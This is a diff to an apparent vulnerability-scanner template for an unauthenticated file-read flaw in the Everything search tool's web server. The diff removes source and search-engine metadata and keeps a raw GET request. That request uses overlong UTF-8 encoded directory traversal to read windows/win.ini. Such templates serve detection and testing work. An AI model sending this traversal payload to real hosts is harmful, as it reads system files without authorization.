@@ -3,12 +3,8 @@ info:
   name: everything存在未授权任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mua7csull176rh1i'
+  description: ''
   tags: lfi,unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mua7csull176rh1i
-    fofa: title==Everything
 http:
 - raw:
   - GET /C:/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afwindows%c0%afwin.ini HTTP/1.1
